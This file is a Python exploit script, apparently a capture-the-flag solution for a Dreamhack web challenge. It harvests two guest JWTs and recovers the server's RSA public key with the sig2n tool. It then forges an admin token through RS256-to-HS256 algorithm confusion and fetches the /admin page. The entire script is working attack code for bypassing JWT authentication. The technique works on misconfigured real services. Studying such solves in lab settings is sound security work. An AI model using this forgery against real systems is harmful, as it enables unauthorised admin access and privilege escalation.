#!/usr/bin/env python3
import base64
import hashlib
import hmac
import json
import re
import subprocess
import sys
import time
import traceback
import jwt
import requests
from calendar import timegm
from datetime import datetime

if len(sys.argv) == 3:
    print('************************************')
    print('*              REMOTE              *')
    print('************************************')
    HOST = f'{sys.argv[1]}:{sys.argv[2]}'
else:
    print('************************************')
    print('*               LOCAL              *')
    print('************************************')
    HOST = 'host8.dreamhack.games:20067'

BASE_URL = f'http://{HOST}'

def getJWTToken():
    s = requests.Session()
    body = {
        'username': 'guest',
        'password': 'guest'
    }
    s.post(f'{BASE_URL}/login', data=body)
    return s.cookies['token']

# sig2n can fail to get the proper public key. so we loop until
# entire processes are successful.
while True:
    try:
        # get two different JWT tokens
        print('getting two different JWT tokens...')
        tokens = []
        for _ in range(2):
            tokens.append(getJWTToken())
            time.sleep(1) # this is to get different tokens(both `iat` and
                            # `exp` header have different value by time).
        print('token[0]..', tokens[0])
        print('token[1]..', tokens[1])


        # get RSA public key from the two tokens by running sig2n
        print('getting RSA public key from the two tokens by running sig2n (may take a while)...')
        # can be failed if the both k_i are not coprime integers each other.
        output = subprocess.check_output(f'docker run --rm -it portswigger/sig2n {tokens[0]} {tokens[1]}', shell=True)
        print(output)
        base64_pub_key = re.findall(r'Base64 encoded x509 key: (.+)\r', output.decode())[0]
        with open('pub.crt', 'wb') as f:
            f.write(base64.b64decode(base64_pub_key))

        # forging a token (guest -> admin, RS256 -> HS256)
        print('forging the token (guest -> admin, RS256 -> HS256)...')
        token = tokens[0]
        with open('pub.crt', 'rb') as f:
            key = f.read()
        algorithms = ['RS256']
        payload = jwt.decode(token, key, algorithms=algorithms)


        # token forgery - construct header
        header = {"alg": "HS256", "typ": "JWT"}
        json_header = json.dumps(header, separators=(",", ":"), cls=None).encode()

        # # token forgery - construct payload
        payload['username'] = 'admin'
        for time_claim in ["exp", "iat", "nbf"]:
        # token forgery - Convert datetime to a intDate value in known time-format claims
            if isinstance(payload.get(time_claim), datetime):
                payload[time_claim] = timegm(payload[time_claim].utctimetuple())
        json_payload = json.dumps(payload, separators=(",", ":"), cls=None).encode("utf-8")

        segments = []
        segments.append(base64.urlsafe_b64encode(json_header).replace(b'=', b''))
        segments.append(base64.urlsafe_b64encode(json_payload).replace(b'=', b''))

        # # token forgery - construct signature
        signing_input = b".".join(segments)
        signature = hmac.new(key, signing_input, hashlib.sha256).digest()
        segments.append(base64.urlsafe_b64encode(signature).replace(b'=', b''))

        forged_token = b'.'.join(segments).decode()
        break
    except Exception as e:
        print('failed. running again...', e)
        print(traceback.format_exc())

print('forged token..', forged_token)

cookies = {'token': forged_token}
res = requests.get(f'http://{HOST}/admin', cookies=cookies)
print(res.text)